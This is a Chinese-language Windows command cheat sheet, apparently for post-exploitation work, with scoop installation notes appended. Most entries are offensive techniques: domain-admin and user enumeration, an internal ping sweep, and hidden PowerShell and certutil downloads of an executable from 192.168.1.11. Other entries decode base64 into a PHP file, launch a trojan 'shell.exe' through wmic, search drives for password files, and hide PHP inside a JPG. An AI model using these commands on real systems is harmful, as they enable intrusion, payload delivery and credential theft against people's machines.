Windows命令

查看当前用户权限

whoami /all

查看在线用户

quser

查看本机用户

net user

查看域用户

net user /domain

查看域管理员用户组

net group "Enterprise Admins" /domain

查看进程

tasklist /svc

查看开机时间

net statistics workstation

网卡详细信息

ipconfig /all

系统详细信息

systeminfo

跟踪路由信息

tracert 10.0.0.3

wmic查看操作系统版本

wmic os get name
wmic os get caption,buildnumber

查找指定文件路径，并在同级目录下新建一个文件

//delims以!作为分隔符，防止空格
for /f "delims=!" %i in ('dir /s /b c:adminadmin.txt') do echo %i > %i/../path.txt

certutil base64解码写文件

//写入2.txt
del 2.txt && echo PD9waHAgcGhwaW5mbygpOz8+ > 1.txt && certutil -decode 1.txt 2.txt && del 1.txt

powershell base64解码写文件

powershell -w hidden -c "'PD9waHAgcGhwaW5mbygpOz8+' | ForEach-Object { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_)) } | Set-Content -Path 'c:\temp\a.txt'"

wmic执行命令（结果无回显）

//无回显命令执行
wmic process call create "cmd.exe /c whoami > c:\temp\aaa.txt"

//执行木马
wmic process call create "c:\temp\shell.exe"

停止进程

//通过进程名停止
wmic process where name="explorer.exe" call terminate
taskkill /f /im cmd.exe

//通过进程id停止
taskkill /f /pid 1234

ping内网主机探测

for /l %i in (1,1,254) do @ping -w 1 -n 1 10.10.10.%i | findstr "TTL=" > aa.txt

powershell base编码字符串

powershell $fileContent = "123456";$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent);$encodedCommand = [Convert]::ToBase64String($bytes);$encodedCommand

powershell base64编码文件

powershell $filePath = "c:\path\file.txt";$fileContent = Get-Content -Path $filePath;$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent);$encodedCommand = [Convert]::ToBase64String($bytes);$encodedCommand

powershell 16进制编码文件

//编码aaa.txt，结果保存到bbb.txt
powershell $fileContent = Get-Content -Path "aa.txt" -Encoding Byte;$hexEncodedContent = $fileContent | ForEach-Object { $_.ToString("X2") };$hexEncodedContent | Out-File -FilePath "bbb.txt" -NoNewline

certutil下载文件

certutil -urlcache -split -f  http://192.168.1.11/aa.txt aa.exe

//查看缓存
certutil.exe -urlcache *
//删除所有缓存
certutil.exe -urlcache * delete
//删除指定缓存
certutil -urlcache -split -f  http://192.168.1.11/aa.txt delete

powershell下载文件

powershell -w hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.1.11/aa.txt','aa.exe')

netstat -ano

合并文件

copy 1.jpg/b+1.php/a 2.jpg

查找文件

# 全盘查找文件，一定要加一个星号
for /r c:\ %i in (password.txt*) do @echo %i
for /r c:\ %i in (*.ini) do @echo %i

# 查找 C 盘中包含 password 字样的文件，一定要双引号
findstr /s /n "password" c:\*

# 查找 pwd.txt 中是否包含 password 字样，一定要双引号
find /N /I "password" pwd.txt

powershell判断是否是域环境

Get-WmiObject Win32_ComputerSystem | select -ExpandProperty Domain

wmic获取文件路径

wmic datafile where "drive='d:' and FileName='123qwe' and Extension='txt'" get name

forfiles查找文件路径并在当前路径下写入

cmd /c forfiles /p d:\ /s /m 123qwe.txt /c "cmd /c echo @path>456.txt"

wsl --import kali-linux D:\WSLHost\kali-linux D:\WSLHost\kali-linux.tar --version 2

windows安装scoop

  • powershell执行
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
  • scoop设置安装目录
# 设置设置Scoop为其他目录
$env:SCOOP='D:\Scoop'
[Environment]::SetEnvironmentVariable('SCOOP',$env:SCOOP,'User')

# 设置Scoop global 为其他目录
$env:SCOOP_GLOBAL='D:\ScoopGlobalApps'
[Environment]::SetEnvironmentVariable('SCOOP_GLOBAL',$env:SCOOP_GLOBAL,'Machine')

# 然后安装scoop即可
  • scoop安装各种环境
scoop install git
scoop update

scoop search <想要安装的软件>
scoop bucket add <想要安装的软件所在的bucket>
scoop install <想要安装的软件>
